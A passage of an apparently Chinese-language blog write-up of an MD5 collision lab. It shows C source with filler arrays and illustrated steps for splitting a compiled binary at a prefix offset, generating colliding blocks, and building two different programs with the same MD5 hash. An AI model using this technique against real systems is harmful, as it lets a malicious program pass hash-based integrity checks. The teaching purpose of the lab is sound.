class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">200</span>; i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, xyz[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032650.png"alt="image-20230927200830144" /><figcaption aria-hidden="true">image-20230927200830144</figcaption></figure></li><li><p>使用bless查看demo.out文件，先找到数组位置，数组开始位置为0x3020，从而得到前缀结束位置：0x3040（由于0x3020不是64的倍数，需扩展到64的倍数），对应10进制数为12352。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032651.png"alt="image-20230927200915995" /><figcaption aria-hidden="true">image-20230927200915995</figcaption></figure></li><li><p>截取前缀部分，作为demo_prefix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032652.png"alt="image-20230927201000671" /><figcaption aria-hidden="true">image-20230927201000671</figcaption></figure></li><li><p>根据该前缀生成两个具有相同 MD5哈希值的文件(每个生成文件的最后128位是P和Q)。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032653.png"alt="image-20230927201015560" /><figcaption aria-hidden="true">image-20230927201015560</figcaption></figure></li><li><p>截取后缀部分（前缀部分+128字节开始），作为demo_suffix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032654.png"alt="image-20230927201030131" /><figcaption aria-hidden="true">image-20230927201030131</figcaption></figure></li><li><p>使用第四步生成的文件分别和demo_suffix进行拼接，得到demo_out1s.bin和demo_out2s.bin。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032655.png"alt="image-20230927201047554" /><figcaption aria-hidden="true">image-20230927201047554</figcaption></figure></li><li><p>步骤1得到demo_out1s.bin和demo_out2s.bin的内容不同，步骤2得到它们的哈希值相同。通过bless中对两个文件分析，发现中间128字节内容仅个别字节不同，大部分相同。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032656.png"alt="image-20230927201108023" /><figcaption aria-hidden="true">image-20230927201108023</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032657.png"alt="image-20230927201114742" /><figcaption aria-hidden="true">image-20230927201114742</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032658.png"alt="image-20230927201121256" /><figcaption aria-hidden="true">image-20230927201121256</figcaption></figure></li></ol><h2 id="task-4-making-the-two-programs-behave-differently">Task 4:Making the Two Programs Behave Differently</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032659.png"alt="image-20230927202206700" /><figcaption aria-hidden="true">image-20230927202206700</figcaption></figure><ol type="1"><li><p>目标：生成两个行为不同，但哈希值相同的目标程序。</p></li><li><p>根据实验指导，编写task4.c程序，并进行编译。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-comment">/* The actual contents of this array are up to you */</span><br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> b[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-comment">/* The actual contents of this array are up to you */</span><br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span 